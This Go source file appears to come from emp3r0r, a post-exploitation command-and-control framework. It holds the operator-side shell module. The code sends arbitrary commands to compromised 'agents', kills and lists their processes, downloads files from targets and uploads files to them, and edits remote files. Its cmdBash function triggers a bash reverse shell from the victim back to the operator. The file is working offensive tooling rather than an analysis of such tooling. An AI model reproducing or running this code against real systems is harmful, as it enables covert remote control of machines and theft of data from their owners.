package cc

import (
	"fmt"
	"io"
	"strings"
	"time"

	"github.com/bettercap/readline"
	"github.com/fatih/color"
	"github.com/google/uuid"
	"github.com/jm33-m0/emp3r0r/core/internal/agent"
)

// RShellStatus stores error message from agent
var RShellStatus error

// moduleCmd exec cmd on target
func moduleCmd() {
	// find target
	target := CurrentTarget
	if target == nil {
		CliPrintError("moduleCmd: Target does not exist")
		return
	}

	// write to given target's connection
	if Targets[target] == nil {
		CliPrintError("moduleCmd: agent control interface not found")
		return
	}
	if Targets[target].Conn == nil {
		CliPrintError("moduleCmd: agent is not connected")
		return
	}

	// send data
	var data agent.MsgTunData
	data.Payload = "cmd" + agent.OpSep + Options["cmd_to_exec"].Val
	data.Tag = target.Tag
	err := Send2Agent(&data, target)
	if err != nil {
		CliPrintError("moduleCmd: %v", err)
	}
}

// moduleShell like moduleCmd, but interactive, like all shells do
func moduleShell() {
	// find target
	target := CurrentTarget
	if target == nil {
		CliPrintError("moduleShell: Target does not exist")
		return
	}

	// write to given target's connection
	tControl := Targets[target]
	if tControl == nil {
		CliPrintError("moduleShell: agent control interface not found")
		return
	}
	if tControl.Conn == nil {
		CliPrintError("moduleShell: agent is not connected")
		return
	}

	// send data
	var data agent.MsgTunData
	CliPrintInfo("\nEntering shell of agent[%d] ...\n"+
		"Note: Use `bash` command to start a bash reverse shell, type `help` for more info",
		tControl.Index)

shell:
	for {
		// set prompt to shell
		oldPrompt := EmpReadLine.Config.Prompt
		EmpReadLine.SetPrompt(color.HiMagentaString("shell [%d] > ", tControl.Index))
		defer EmpReadLine.SetPrompt(oldPrompt)

		// read user input
		input, err := EmpReadLine.Readline()
		if err != nil {
			if err == readline.ErrInterrupt {
				if len(input) == 0 {
					break
				} else {
					continue
				}
			} else if err == io.EOF {
				break
			}
			CliPrintError("Error: %v", err)
			break
		}

		input = strings.TrimSpace(input)
		inputSlice := strings.Fields(input)

		// deal with input
		switch {
		case input == "exit":
			break shell
		case input == "":
			continue shell
		case input == "help":
			CliPrettyPrint("Helper", "Usage", &ShellHelpInfo)
			continue shell

		case input == "bash":
			if err = cmdBash(); err != nil {
				return
			}
			break shell

		case inputSlice[0] == "#kill":
			if len(inputSlice) < 2 {
				CliPrintError("#kill <pids to kill>")
				continue shell
			}
			err = SendCmd("#kill "+strings.Join(inputSlice[1:], " "), target)
			if err != nil {
				CliPrintError("failed to send command: %v", err)
				continue shell
			}

		case inputSlice[0] == "#ps":
			err = SendCmd("#ps", target)
			if err != nil {
				CliPrintError("failed to send command: %v", err)
				continue shell
			}

		case inputSlice[0] == "get":
			// #put file to agent
			if len(inputSlice) != 2 {
				CliPrintError("get <remote path>")
				continue shell
			}

			if err = GetFile(inputSlice[1], target); err != nil {
				CliPrintError("Cannot get %s: %v", inputSlice[2], err)
			}
			continue shell

		case inputSlice[0] == "put":
			// #put file to agent
			if len(inputSlice) != 3 {
				CliPrintError("put <local path> <remote path>")
				continue shell
			}

			if err = PutFile(inputSlice[1], inputSlice[2], target); err != nil {
				CliPrintError("Cannot put %s: %v", inputSlice[2], err)
			}
			continue shell

		case inputSlice[0] == "vim":

			if len(inputSlice) < 2 {
				CliPrintError("What file do you want to edit?")
				continue shell
			}
			filepath := inputSlice[1]
			filename := FileBaseName(filepath)

			// tell user what to do
			color.HiBlue("[*] Now edit %s in vim window",
				filepath)

			// edit remote files
			if GetFile(filepath, target) != nil {
				CliPrintError("Cannot download %s", filepath)
				continue shell
			}

			if err = VimEdit(FileGetDir + filename); err != nil {
				CliPrintError("VimEdit: %v", err)
				continue shell
			} // wait until vim exits

			// upload the new file to target
			if PutFile(FileGetDir+filename, filepath, target) != nil {
				CliPrintError("Cannot upload %s", filepath)
			}
			continue shell
		default:
		}

		// send command
		data.Payload = fmt.Sprintf("cmd%s%s", agent.OpSep, input)
		data.Tag = target.Tag
		err = Send2Agent(&data, target)
		if err != nil {
			CliPrintError("moduleShell: %v", err)
		}
	}
	CliPrintSuccess("\n[*] shell[%d] finished", tControl.Index)
}

func cmdBash() (err error) {
	// activate reverse shell in agent
	token := uuid.New().String()
	RShellStream.Text = token
	cmd := fmt.Sprintf("bash %s", token)
	err = SendCmd(cmd, CurrentTarget)
	if err != nil {
		CliPrintError("Cannot activate reverse shell on remote target: ", err)
		return
	}

	// wait for agent to send shell
	for {
		if RShellStatus != nil {
			CliPrintError("[-] An error occured: %v", RShellStatus)
			return RShellStatus
		}
		if RShellStream.H2x.Ctx != nil && RShellStream.H2x.Conn != nil {
			break
		}
		time.Sleep(200 * time.Millisecond)
	}

	// launch local terminal to use remote bash shell
	send := make(chan []byte)
	reverseBash(RShellStream.H2x.Ctx, send, RShellStream.Buf)
	time.Sleep(1 * time.Second)

	return
}
